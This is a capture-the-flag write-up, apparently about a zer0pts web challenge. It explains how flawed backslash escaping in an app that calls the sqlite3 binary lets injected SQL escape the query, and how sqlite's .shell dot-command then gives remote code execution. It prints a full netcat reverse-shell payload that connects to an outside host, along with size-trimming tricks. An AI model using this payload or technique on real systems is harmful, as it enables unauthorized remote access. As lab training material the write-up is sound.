Summarizing the code, our username is passed to sqlite3_escape, formatted into a query, and sent to sqlite3_query. One thing to note here is that the escaping function adds a \ infront of the block listed characters. In addition, the way the query is ran is not through a sqlite3 library but rather with a Process.

Let’s break this down one at a time. First, how are we even able to inject SQL? After a bit of googling, we found that sqlite escapes characters via double quotations, i.e `"a escaped "" wow"`. This will properly escape the quotation mark. However, as we looked at earlier the sqlite3_escape method adds backslashes.

With this in mind, we are now able to craft queries like the following.

`SELECT * FROM users WHERE username="alice\"" AND password="asdf"`

This doesn’t properly escape the quotation mark, rather it just throws an error. Now we can inject a semicolon and exit the statement! If our payload is ";, our query now becomes the following.

`SELECT * FROM users WHERE username="alice\";" AND password="asdf"`

To make this exploitable, we used some attributes from the allow list. Two interesting things is that all whitespace (spaces, tabs, newlines) are allowed and periods (.) are allowed. We know that sqlite has special commands for statements that start with periods so we can think about how to exploit this.

What we ended up doing was adding a newline, calling the .shell function with arguments we wanted, and adding a final newline to get rid of the junk. This works because a newline is interpreted as a new command to the process. Although individual lines may error, the process is still running and thus our commands would still go through.

Our final payload was the following and has some tricks to make it smaller to reach the character limit where xxx.xx is your domain.

`";\n.shell nc xxx.xx 8 -e sh\n`

There are some things to address about our payload. First, why are we able to include a -e when it would become \-e and not work? This was discovered during testing by a teammate but we found that the .shell command actually expands the backslashes. This means it will actually become -e when the command is executed.

Second, there are some optimizations to the nc reverse shell. The two main things were using a small port (8) and using sh instead of /bin/sh. Port 8 works but the listener must be run with sudo due to it not being a typically used port. The optimization to use sh came from local testing. I cannot say how important local testing is! If you are given the docker environment, like many of the zer0pts challenges were, always run the docker and try stuff out locally. You never know what you may find.

With this final payload, we are able to get a shell on the system and cat index.html for the flag. The description was a bit misleading as we needed RCE not just a typical sql injection but a very interesting challenge overall.
